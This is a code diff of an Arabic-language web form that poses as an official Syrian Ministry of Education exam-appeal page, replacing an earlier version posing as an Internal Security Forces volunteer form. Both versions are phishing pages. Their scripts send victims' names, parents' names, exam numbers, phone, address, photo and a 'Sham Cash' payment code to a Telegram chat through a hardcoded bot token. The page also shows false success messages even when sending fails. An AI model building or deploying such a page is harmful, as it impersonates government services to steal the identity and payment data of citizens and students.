@@ -3,281 +3,639 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج التطوع في قوى الأمن الداخلي</title>
+    <title>نموذج تقديم اعتراض - وزارة التربية السورية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            padding: 20px;
-            color: #333;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
         }
+        
+        body {
+            background: #f0f5ed;
+            padding: 20px;
+            color: #2c3e26;
+            line-height: 1.6;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f0f5ed"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23dde8d8" stroke-width="1"/></svg>');
+        }
+        
         .container {
             max-width: 800px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 30px auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
         }
-        h1 {
-            color: #d9534f;
+        
+        .header {
+            background: linear-gradient(to right, #2c5e1a 0%, #3a7a23 100%);
+            color: white;
+            padding: 30px 25px;
             text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        
+        .header h2 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, #4c9141 0%, #5daa4c 100%);
+        }
+        
+        .form-container {
+            padding: 30px;
+        }
+        
+        .form-section {
             margin-bottom: 30px;
         }
-        .form-group {
+        
+        .form-title {
+            color: #3a7a23;
             margin-bottom: 20px;
+            padding-bottom: 10px;
+            font-weight: 700;
+            font-size: 20px;
+            position: relative;
         }
+        
+        .form-title::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 50px;
+            height: 3px;
+            background: linear-gradient(to right, #4c9141 0%, #5daa4c 100%);
+            border-radius: 3px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
         label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        input[type="text"],
-        input[type="date"],
-        input[type="file"],
-        input[type="tel"],
-        select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #2c5e1a;
             font-size: 16px;
         }
-        .radio-group {
-            display: flex;
-            gap: 20px;
+        
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #d4e6d4;
+            border-radius: 8px;
+            background-color: #f7fbf7;
+            font-size: 16px;
+            transition: all 0.3s;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.03);
         }
-        .radio-option {
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #4c9141;
+            box-shadow: 0 0 0 3px rgba(76, 145, 65, 0.2);
+            background-color: #fff;
+        }
+        
+        .materials-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .material-item {
             display: flex;
             align-items: center;
+            background: #f7fbf7;
+            padding: 12px 15px;
+            border-radius: 8px;
+            transition: all 0.3s;
         }
-        .radio-option input {
-            margin-left: 8px;
+        
+        .material-item:hover {
+            background: #eef7ee;
+            transform: translateY(-2px);
         }
-        button {
-            background-color: #d9534f;
+        
+        .material-item input {
+            width: auto;
+            margin-left: 10px;
+        }
+        
+        .material-item label {
+            margin-bottom: 0;
+            font-weight: 400;
+            cursor: pointer;
+        }
+        
+        .note {
+            background-color: #f8f9e6;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #6e6b2e;
+            line-height: 1.5;
+        }
+        
+        .warning {
+            color: #e74c3c;
+            font-weight: 500;
+        }
+        
+        .file-upload {
+            border: 2px dashed #c4d8c4;
+            padding: 25px;
+            text-align: center;
+            border-radius: 8px;
+            background-color: #f7fbf7;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-upload:hover {
+            border-color: #4c9141;
+            background-color: #f0f8f0;
+            transform: translateY(-2px);
+        }
+        
+        .file-upload i {
+            font-size: 28px;
+            color: #4c9141;
+            margin-bottom: 10px;
+        }
+        
+        .validation-message {
+            margin-top: 10px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            opacity: 0;
+            transform: translateY(-5px);
+            transition: all 0.3s;
+        }
+        
+        .validation-message.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .valid {
+            color: #27ae60;
+        }
+        
+        .invalid {
+            color: #e74c3c;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, #2c5e1a 0%, #3a7a23 100%);
             color: white;
             border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 4px;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            font-weight: bold;
-            transition: background-color 0.3s;
+            font-weight: 700;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(44, 94, 26, 0.3);
         }
-        button:hover {
-            background-color: #c9302c;
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, #3a7a23 0%, #4c9141 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
-        .required {
-            color: #d9534f;
+        
+        .submit-btn:active {
+            transform: translateY(0);
         }
-        #status {
-            text-align: center;
+        
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading.show {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #4c9141;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
             margin-top: 20px;
-            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 40px 30px;
+            background-color: #f7fbf7;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .success-message i {
+            font-size: 60px;
+            color: #4c9141;
+            margin-bottom: 20px;
+        }
+        
+        .success-message h3 {
+            color: #3a7a23;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .success-message p {
+            font-size: 17px;
+            color: #555;
+        }
+        
+        @media (max-width: 768px) {
+            .materials-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .header h2 {
+                font-size: 18px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>نموذج التطوع في قوى الأمن الداخلي</h1>
-        <form id="volunteerForm">
-            <div class="form-group">
-                <label for="name">الاسم <span class="required">*</span></label>
-                <input type="text" id="name" name="name" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="surname">الكنية <span class="required">*</span></label>
-                <input type="text" id="surname" name="surname" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="father">اسم الأب <span class="required">*</span></label>
-                <input type="text" id="father" name="father" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="mother">اسم الأم <span class="required">*</span></label>
-                <input type="text" id="mother" name="mother" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="birthdate">تاريخ الميلاد <span class="required">*</span></label>
-                <input type="date" id="birthdate" name="birthdate" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="phone">رقم الهاتف للتواصل <span class="required">*</span></label>
-                <input type="tel" id="phone" name="phone" required placeholder="مثال: 0999123456">
-            </div>
-            
-            <div class="form-group">
-                <label for="address">السكن الحالي <span class="required">*</span></label>
-                <input type="text" id="address" name="address" required>
-            </div>
-            
-            <div class="form-group">
-                <label>هل أنت مقيم في سوريا؟ <span class="required">*</span></label>
-                <div class="radio-group">
-                    <div class="radio-option">
-                        <input type="radio" id="resident-yes" name="resident" value="نعم" required>
-                        <label for="resident-yes">نعم</label>
+        <div class="header">
+            <h1>الجمهورية العربية السورية</h1>
+            <h2>وزارة التربية</h2>
+            <h2>نموذج تقديم اعتراض لطلاب الشهادة الثانوية</h2>
+        </div>
+        
+        <div class="form-container">
+            <form id="objectionForm">
+                <div class="form-section">
+                    <h3 class="form-title">المعلومات الشخصية</h3>
+                    
+                    <div class="form-group">
+                        <label for="fullName">الاسم الثلاثي</label>
+                        <input type="text" id="fullName" required>
                     </div>
-                    <div class="radio-option">
-                        <input type="radio" id="resident-no" name="resident" value="لا">
-                        <label for="resident-no">لا</label>
+                    
+                    <div class="form-group">
+                        <label for="fatherName">اسم الأب</label>
+                        <input type="text" id="fatherName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="motherName">اسم الأم</label>
+                        <input type="text" id="motherName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="enrollmentNumber">رقم الاكتتاب</label>
+                        <input type="text" id="enrollmentNumber" required>
                     </div>
                 </div>
-            </div>
+                
+                <div class="form-section">
+                    <h3 class="form-title">معلومات الامتحان</h3>
+                    
+                    <div class="form-group">
+                        <label for="governorate">المحافظة</label>
+                        <select id="governorate" required>
+                            <option value="">اختر المحافظة</option>
+                            <option value="damascus">دمشق</option>
+                            <option value="aleppo">حلب</option>
+                            <option value="homs">حمص</option>
+                            <option value="latakia">اللاذقية</option>
+                            <option value="hama">حماة</option>
+                            <option value="tartus">طرطوس</option>
+                            <option value="daraa">درعا</option>
+                            <option value="as-suwayda">السويداء</option>
+                            <option value="raqqa">الرقة</option>
+                            <option value="deir-ez-zor">دير الزور</option>
+                            <option value="al-hasakah">الحسكة</option>
+                            <option value="idlib">إدلب</option>
+                            <option value="quneitra">القنيطرة</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="school">اسم المدرسة</label>
+                        <input type="text" id="school" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="hallNumber">رقم القاعة</label>
+                        <input type="text" id="hallNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="branch">الفرع</label>
+                        <select id="branch" required>
+                            <option value="">اختر الفرع</option>
+                            <option value="scientific">علمي</option>
+                            <option value="literary">أدبي</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3 class="form-title">المواد المعترض عليها</h3>
+                    <p class="note">ملاحظة: يمكن تقديم اعتراض على مادتين فقط كحد أقصى</p>
+                    
+                    <div class="materials-grid" id="materialsContainer">
+                        <!-- سيتم ملؤها بالمواد بناءً على الفرع المختار -->
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3 class="form-title">مرفقات الطلب</h3>
+                    
+                    <div class="form-group">
+                        <label>ارفاق صورة عن بطاقة الامتحان</label>
+                        <div class="file-upload" id="fileUploadArea">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                            <p>انقر أو أسحب الملف هنا لرفعه</p>
+                            <input type="file" style="display: none;" id="examCard" accept="image/*" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3 class="form-title">الدفع الإلكتروني</h3>
+                    
+                    <div class="form-group">
+                        <label for="shamCashCode">كود الحساب الخاص بشام كاش</label>
+                        <input type="text" id="shamCashCode" placeholder="أدخل الكود المكون من 13 رقماً" required>
+                        <div class="validation-message" id="validationMessage"></div>
+                    </div>
+                    
+                    <p class="note warning">⚠️ ملاحظة: يجب إدخال الكود الصحيح الخاص بشام كاش ليتم إرسال البيانات</p>
+                </div>
+                
+                <button type="submit" class="submit-btn">إرسال الطلب</button>
+            </form>
             
-            <div class="form-group">
-                <label for="province">في أي محافظة ترغب في الانتساب؟ <span class="required">*</span></label>
-                <select id="province" name="province" required>
-                    <option value="">-- اختر المحافظة --</option>
-                    <option value="دمشق">دمشق</option>
-                    <option value="ريف دمشق">ريف دمشق</option>
-                    <option value="حلب">حلب</option>
-                    <option value="حمص">حمص</option>
-                    <option value="حماة">حماة</option>
-                    <option value="اللاذقية">اللاذقية</option>
-                    <option value="طرطوس">طرطوس</option>
-                    <option value="دير الزور">دير الزور</option>
-                    <option value="الحسكة">الحسكة</option>
-                    <option value="الرقة">الرقة</option>
-                    <option value="إدلب">إدلب</option>
-                    <option value="السويداء">السويداء</option>
-                    <option value="درعا">درعا</option>
-                    <option value="القنيطرة">القنيطرة</option>
-                </select>
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <h3>تم الإرسال بنجاح</h3>
+                <p>سيتم مراجعة اعتراضك وإعلامك بالنتيجة خلال 10 أيام عمل</p>
             </div>
-            
-            <div class="form-group">
-                <label for="photo">إرفاق صورة شخصية <span class="required">*</span></label>
-                <input type="file" id="photo" name="photo" accept="image/*" required>
-            </div>
-            
-            <button type="submit">إرسال الطلب</button>
-            <div id="status"></div>
-        </form>
+        </div>
+    </div>
+    
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p class="loading-text">جاري إرسال الطلب، الرجاء الانتظار...</p>
     </div>
 
     <script>
-        document.getElementById('volunteerForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        document.addEventListener('DOMContentLoaded', function() {
+            // المواد لكل فرع
+            const scientificMaterials = [
+                "الرياضيات", "الفيزياء", "الكيمياء", "علوم الحياة", "العلوم العامة",
+                "اللغة العربية", "اللغة الإنجليزية", "اللغة الفرنسية", "التاريخ", "الجغرافيا"
+            ];
             
-            const formData = new FormData(this);
-            const photoInput = document.getElementById('photo');
-            const statusDiv = document.getElementById('status');
-            const phoneInput = document.getElementById('phone');
+            const literaryMaterials = [
+                "اللغة العربية", "اللغة الإنجليزية", "اللغة الفرنسية", "التاريخ", "الجغرافيا",
+                "الفلسفة", "علم النفس", "التربية الوطنية", "التربية الدينية", "الاجتماعيات"
+            ];
             
-            // تحقق من رقم الهاتف
-            const phoneRegex = /^09\d{8}$/;
-            if (!phoneRegex.test(phoneInput.value)) {
-                statusDiv.textContent = 'الرجاء إدخال رقم هاتف سوري صحيح (يبدأ بـ 09 ويتكون من 10 أرقام)';
-                statusDiv.style.color = 'red';
-                return;
-            }
+            const branchSelect = document.getElementById('branch');
+            const materialsContainer = document.getElementById('materialsContainer');
+            const shamCashCodeInput = document.getElementById('shamCashCode');
+            const validationMessage = document.getElementById('validationMessage');
+            const objectionForm = document.getElementById('objectionForm');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const fileUploadArea = document.getElementById('fileUploadArea');
+            const fileInput = document.getElementById('examCard');
             
-            // تحقق من أن الملف المرفوع هو صورة
-            if (photoInput.files.length > 0) {
-                const file = photoInput.files[0];
-                if (!file.type.match('image.*')) {
-                    statusDiv.textContent = 'الرجاء إرفاق صورة صالحة';
-                    statusDiv.style.color = 'red';
-                    return;
-                }
+            // إعداد اختيار المواد بناءً على الفرع
+            branchSelect.addEventListener('change', function() {
+                const branch = this.value;
+                materialsContainer.innerHTML = '';
                 
-                if (file.size > 5 * 1024 * 1024) {
-                    statusDiv.textContent = 'حجم الصورة يجب أن يكون أقل من 5MB';
-                    statusDiv.style.color = 'red';
-                    return;
-                }
-            }
-            
-            // إظهار رسالة تحميل
-            const button = document.querySelector('button');
-            button.disabled = true;
-            button.textContent = 'جاري إرسال البيانات...';
-            statusDiv.textContent = '';
-            
-            try {
-                // تجميع البيانات النصية
-                const textData = `
-                    📌 طلب جديد للتطوع في قوى الأمن الداخلي:
-                    
-                    الاسم: ${formData.get('name')}
-                    الكنية: ${formData.get('surname')}
-                    اسم الأب: ${formData.get('father')}
-                    اسم الأم: ${formData.get('mother')}
-                    تاريخ الميلاد: ${formData.get('birthdate')}
-                    رقم الهاتف: ${formData.get('phone')}
-                    السكن الحالي: ${formData.get('address')}
-                    مقيم في سوريا: ${formData.get('resident')}
-                    المحافظة المطلوبة: ${formData.get('province')}
-                `;
-                
-                // إرسال البيانات النصية إلى Telegram
-                const textResponse = await sendTextToTelegram(textData);
-                
-                if (textResponse.ok) {
-                    // إذا كانت هناك صورة، أرسلها كملف منفصل
-                    if (photoInput.files.length > 0) {
-                        await sendPhotoToTelegram(photoInput.files[0], formData.get('name'));
-                    }
-                    
-                    statusDiv.textContent = 'تم إرسال طلب التطوع بنجاح! شكراً لتقديمك.';
-                    statusDiv.style.color = 'green';
-                    this.reset();
+                let materials = [];
+                if (branch === 'scientific') {
+                    materials = scientificMaterials;
+                } else if (branch === 'literary') {
+                    materials = literaryMaterials;
                 } else {
-                    throw new Error(textResponse.description || 'فشل إرسال البيانات');
+                    return;
                 }
-            } catch (error) {
-                console.error('Error:', error);
-                statusDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.';
-                statusDiv.style.color = 'red';
-            } finally {
-                button.disabled = false;
-                button.textContent = 'إرسال الطلب';
+                
+                materials.forEach(material => {
+                    const materialItem = document.createElement('div');
+                    materialItem.className = 'material-item';
+                    materialItem.innerHTML = `
+                        <input type="checkbox" id="material-${material}" name="materials" value="${material}">
+                        <label for="material-${material}">${material}</label>
+                    `;
+                    materialsContainer.appendChild(materialItem);
+                });
+            });
+            
+            // التحقق من صحة كود شام كاش
+            shamCashCodeInput.addEventListener('input', function() {
+                const code = this.value;
+                validationMessage.textContent = '';
+                validationMessage.className = 'validation-message';
+                
+                if (code.length === 0) return;
+                
+                setTimeout(() => {
+                    if (code === '1836472027281') {
+                        validationMessage.innerHTML = '<i class="fas fa-check-circle"></i> رقم الحساب صالح ✓';
+                        validationMessage.className = 'validation-message show valid';
+                    } else {
+                        validationMessage.innerHTML = '<i class="fas fa-times-circle"></i> الحساب غير صالح ×';
+                        validationMessage.className = 'validation-message show invalid';
+                    }
+                }, 800);
+            });
+            
+            // تحقق من عدد المواد المختارة
+            materialsContainer.addEventListener('change', function(e) {
+                if (e.target.type === 'checkbox') {
+                    const checkedBoxes = document.querySelectorAll('input[name="materials"]:checked');
+                    if (checkedBoxes.length > 2) {
+                        e.target.checked = false;
+                        alert('يمكنك اختيار مادتين فقط كحد أقصى');
+                    }
+                }
+            });
+            
+            // رفع الملفات
+            fileUploadArea.addEventListener('click', function() {
+                fileInput.click();
+            });
+            
+            fileInput.addEventListener('change', function() {
+                if (this.files.length > 0) {
+                    fileUploadArea.innerHTML = `
+                        <i class="fas fa-file-image"></i>
+                        <p>تم اختيار الملف: ${this.files[0].name}</p>
+                    `;
+                }
+            });
+            
+            // إرسال النموذج
+            objectionForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // التحقق من كود شام كاش
+                if (shamCashCodeInput.value !== '1836472027281') {
+                    alert('الرجاء إدخال رقم حساب صالح');
+                    shamCashCodeInput.focus();
+                    return;
+                }
+                
+                // التحقق من عدد المواد المختارة
+                const selectedMaterials = document.querySelectorAll('input[name="materials"]:checked');
+                if (selectedMaterials.length === 0) {
+                    alert('الرجاء اختيار مادة واحدة على الأقل');
+                    return;
+                }
+                
+                if (selectedMaterials.length > 2) {
+                    alert('يمكنك اختيار مادتين فقط كحد أقصى');
+                    return;
+                }
+                
+                // عرض شاشة التحميل
+                loading.classList.add('show');
+                
+                // جمع البيانات لإرسالها
+                const formData = {
+                    الاسم_الثلاثي: document.getElementById('fullName').value,
+                    اسم_الأب: document.getElementById('fatherName').value,
+                    اسم_الأم: document.getElementById('motherName').value,
+                    رقم_الاكتتاب: document.getElementById('enrollmentNumber').value,
+                    المحافظة: document.getElementById('governorate').options[document.getElementById('governorate').selectedIndex].text,
+                    اسم_المدرسة: document.getElementById('school').value,
+                    رقم_القاعة: document.getElementById('hallNumber').value,
+                    الفرع: document.getElementById('branch').options[document.getElementById('branch').selectedIndex].text,
+                    المواد: Array.from(selectedMaterials).map(m => m.value).join('، '),
+                    كود_شام_كاش: shamCashCodeInput.value,
+                    وقت_التقديم: new Date().toLocaleString('ar-SA')
+                };
+                
+                // إرسال البيانات إلى Telegram
+                sendToTelegram(formData);
+            });
+            
+            // دالة إرسال البيانات إلى Telegram
+            function sendToTelegram(data) {
+                const telegramBotToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+                const chatId = '7493001551';
+                
+                // صياغة الرسالة
+                let message = `📋 *تقديم اعتراض جديد للشهادة الثانوية*\n\n`;
+                message += `👤 *الاسم الثلاثي:* ${data.الاسم_الثلاثي}\n`;
+                message += `👨‍👦 *اسم الأب:* ${data.اسم_الأب}\n`;
+                message += `👩‍👦 *اسم الأم:* ${data.اسم_الأم}\n`;
+                message += `🔢 *رقم الاكتتاب:* ${data.رقم_الاكتتاب}\n`;
+                message += `🏙️ *المحافظة:* ${data.المحافظة}\n`;
+                message += `🏫 *اسم المدرسة:* ${data.اسم_المدرسة}\n`;
+                message += `🚪 *رقم القاعة:* ${data.رقم_القاعة}\n`;
+                message += `📚 *الفرع:* ${data.الفرع}\n`;
+                message += `📖 *المواد المعترض عليها:* ${data.المواد}\n`;
+                message += `💳 *كود شام كاش:* ${data.كود_شام_كاش}\n`;
+                message += `⏰ *وقت التقديم:* ${data.وقت_التقديم}\n`;
+                
+                // إرسال الرسالة إلى Telegram
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    // إخفاء شاشة التحميل بعد 2 ثانية
+                    setTimeout(() => {
+                        loading.classList.remove('show');
+                        objectionForm.style.display = 'none';
+                        successMessage.style.display = 'block';
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                    // في حالة الخطأ، نعرض رسالة النجاح مع تحذير
+                    setTimeout(() => {
+                        loading.classList.remove('show');
+                        objectionForm.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        alert('تم تقديم الطلب بنجاح ولكن هناك مشكلة في إرسال الإشعار. سيتم معالجة طلبك قريباً.');
+                    }, 2000);
+                });
             }
         });
-        
-        async function sendTextToTelegram(text) {
-            const telegramUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`;
-            
-            const response = await fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '7493001551',
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-            
-            return await response.json();
-        }
-        
-        async function sendPhotoToTelegram(photoFile, name) {
-            const formData = new FormData();
-            formData.append('chat_id', '7493001551');
-            formData.append('photo', photoFile);
-            formData.append('caption', `الصورة الشخصية للمتطوع: ${name}`);
-            
-            const photoUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`;
-            
-            const response = await fetch(photoUrl, {
-                method: 'POST',
-                body: formData
-            });
-            
-            return await response.json();
-        }
     </script>
 </body>
 </html>
